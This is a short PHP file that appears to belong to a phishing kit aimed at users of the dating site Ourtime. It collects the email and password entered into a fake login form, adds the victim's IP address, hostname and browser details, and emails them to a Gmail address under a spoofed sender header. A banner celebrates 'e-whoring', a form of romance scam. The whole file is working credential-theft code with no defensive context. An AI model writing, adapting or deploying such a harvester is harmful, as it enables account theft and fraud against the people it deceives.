<?php

$ip = getenv("REMOTE_ADDR");  
$hostname = gethostbyaddr($ip);
$user = $_POST['username'];
$pass = $_POST['password'];
$message ="
•••••••••••••••© Ourtime 4 Vairus O. Family ©•••••••••••••••
Email Address: ".$user."
Password: ".$pass."
•••••••••••••••••••••••© Desk Info ©•••••••••••••••••••••••
IP: http://www.ip-score.com/checkip/".$ip."
Browser: ".$_SERVER['HTTP_USER_AGENT']."
Host: ".$hostname."
•••••••••••••••••••^^^Happy E-Whoring^^^•••••••••••••••••••
"; 

$send = 'vairus.oh@gmail.com';
$subject = "Ourtime (".$ip.")"; 
$headers = "From:  Vairus O.<updates@ourtimewhorers.com>"; 
mail($send, $subject, $message, $headers); 

?>